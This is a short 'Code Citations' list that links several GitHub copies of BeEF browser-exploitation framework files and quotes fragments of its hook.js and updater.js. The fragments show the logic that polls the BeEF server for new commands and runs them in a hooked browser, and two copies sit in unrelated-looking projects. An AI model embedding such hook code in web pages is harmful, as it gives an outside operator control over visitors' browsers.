# Code Citations

## License: unknown
https://github.com/dudochka123/dudochka123/tree/5f9678a7b45f08b0683cafb449f877e74bac331b/The%20Butcher_files/hook.js

```
beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/**
 * Object in charge of getting new commands from the BeEF framework and execute them.
 * The XHR-polling channel is managed here. If WebSockets are enabled,
 * websocket.
```


## License: unknown
https://github.com/beefproject/beef/tree/961e8d4ef919fc6a1756763ea589859c92246fbb/core/main/client/updater.js

```
timeout. */ 
	xhr_poll_timeout: "<%= @xhr_poll_timeout %>",
	
	/** Hook session name. */ 
    beefhook: "<%= @hook_session_name %>",
	
	/** A lock. */ 
	lock: false,
	
	/** An object containing
```


## License: unknown
https://github.com/ben-sommer/beef/tree/37450078649449249e0573fab3ebcb629d48c0b5/core/main/client/updater.js

```
>",
	
	/** Hook session name. */ 
    beefhook: "<%= @hook_session_name %>",
	
	/** A lock. */ 
	lock: false,
	
	/** An object containing all values to be registered and sent by the updater. */
```


## License: unknown
https://github.com/asaafan/BeEF/tree/80090daea15f7169bd5c4465dd3eacf590cbf968/core/main/client/updater.js

```
.updater.regObject('java_enabled', 'true');
	 */
	regObject: function(key, value) {
		this.objects[key] = escape(value);
	},
	
	// Checks for new commands from the framework and runs them.
	check: function
```


## License: unknown
https://github.com/zac1997/foodee/tree/2b582ef115066af27582f484cb20c861f1fee1c9/hook.js

```
Checks for new commands from the framework and runs them.
	check: function() {
		if(this.lock == false) {
			if (beef.logger.running) {
				beef.logger.queue();
			}
			beef.net.flush();
			if(
```

